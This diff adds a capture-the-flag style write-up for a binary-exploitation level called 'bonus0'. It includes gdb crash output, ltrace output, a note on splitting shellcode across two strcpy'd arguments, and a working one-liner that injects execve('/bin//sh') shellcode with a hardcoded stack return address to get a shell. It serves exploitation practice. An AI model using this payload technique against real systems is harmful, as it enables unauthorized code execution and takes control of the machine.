@@ -1,0 +1,26 @@
+
+
+gdb ./bonus0 -ex run
+    - 
+    12345678901234567890
+     -
+    123456789AABBCCDDEEFF
+    12345678901234567890123456789AABBCCDDEEF��� 123456789AABBCCDDEEF���
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x42424141 in ?? ()
+
+
+
+ltrace ./bonus0
+    strcpy(0xbffff726, "hello")      = 0xbffff726
+
+
+"""
+arg1=[first 20 bytes of the shell code] ; arg2=[5 last bytes of the shellcode | padding | strcpy return address | padding]
+
+arg1 won't have \0 so it will be read ultil it finds it. This will cause a concat between the two arguments
+"""
+
+
+python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89')" ; python -c "print('\xe1\xb0\x0b\xcd\x80' + '\x90\x90\x90\x90' + '\x26\xf7\xff\xbf' + 8 * 'a' )";cat -) | ./bonus0
